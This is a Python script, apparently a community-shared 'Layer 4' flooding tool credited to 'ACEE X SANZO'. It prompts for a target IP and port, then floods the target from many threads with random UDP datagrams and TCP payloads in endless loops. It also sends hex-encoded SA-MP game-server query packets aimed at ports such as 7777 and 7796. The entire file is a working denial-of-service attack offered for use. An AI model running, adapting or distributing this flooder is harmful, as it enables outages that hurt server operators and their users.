#AUTHOR : ACEE X SANZO
#SUBSCRIBE ACEE AND SANZO
import random
import threading
import codecs
import struct
import time
import socket
import sys
import os

os.system("clear")
print("""
\033[93m
.oooooo.oo     .
d8P'    `Y8   .o8
Y88bo.      .o888oo  .oooo.   oooo d8b  .oooo.o
 `"Y8888o.    888   `P  )88b  `888""8P d88(  "8
     `"Y88b   888    .oP"888   888     `"Y88b.
oo     .d8P   888 . d8(  888   888     o.  )88b
8""88888P'    "888" `Y888""8o d888b    8""888P'

 _                            _  _
| |    __ _ _   _  ___ _ __  | || |
| |   / _` | | | |/ _ \ '__| | || |_
| |__| (_| | |_| |  __/ |    |__   _|
|_____\__,_|\__, |\___|_|       |_|
            |___/
""")

ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input(" Do you want to Attack? (y/n):"))
times = int(input(" Packet:"))
threads = int(input(" Threads:"))
fake_ip = '182.21.20.32'
#Starting Attacking
Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
                       codecs.decode("081e7eda","hex_codec")#cookie port 7784 tambem
                       ]
def run():
	data = random._urandom(1460)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			print("[!] Server Has Been Down!!!")

def run2():
	data = random._urandom(1204)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Server Has Been Downl!!!")
            

def run3():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Server Has Been Down!!!")
            
  
def run4():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Has Been Down!!!")
			
def run5():
	data = random._urandom(47569)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" YOUR ATTACK HAS BEEN LAUNCHED !!!")
		except:
			s.close()
			print("[*] Has Been Down!!!")
            
#Urandom Dan Pacotes
class MyThread(threading.Thread):
     def run(self):
         while True:
                sock = socket.socket(
                    socket.AF_INET, socket.SOCK_DGRAM)
                
                msg = Pacotes[random.randrange(0,5)]
                     
                sock.sendto(msg, (ip, int(port)))
                
                
                if(int(port) == 7777):
                    sock.sendto(Pacotes[5], (ip, int(port)))
                elif(int(port) == 7796):
                    sock.sendto(Pacotes[4], (ip, int(port)))
                elif(int(port) == 7771):
                    sock.sendto(Pacotes[6], (ip, int(port)))
                elif(int(port) == 7784):
                    sock.sendto(Pacotes[7], (ip, int(port)))
                    
                

if __name__ == '__main__':
    try:
     for x in range(200):                                    
            mythread = MyThread()  
            mythread.start()                                  
            time.sleep(.1)    
    except(KeyboardInterrupt):
         os.system('cls' if os.name == 'nt' else 'clear')
         
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
else:
		th = threading.Thread(target = run5)
		th.start()
